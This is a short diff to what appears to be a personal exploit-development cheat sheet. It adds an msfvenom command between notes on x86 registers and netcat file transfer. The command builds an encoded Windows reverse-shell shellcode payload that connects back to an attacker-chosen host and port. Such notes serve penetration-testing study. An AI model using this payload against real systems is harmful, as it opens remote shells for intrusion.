@@ -31,6 +31,11 @@ used for string and array copying
 ##### EDI - Destination Index Register
 pointer addressing data and destination in string/array copying
 
+#### MSFVenom
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "BYTES_GO_here"
+```
+
 # COMMANDS
 ## netcat
 #### file transfer
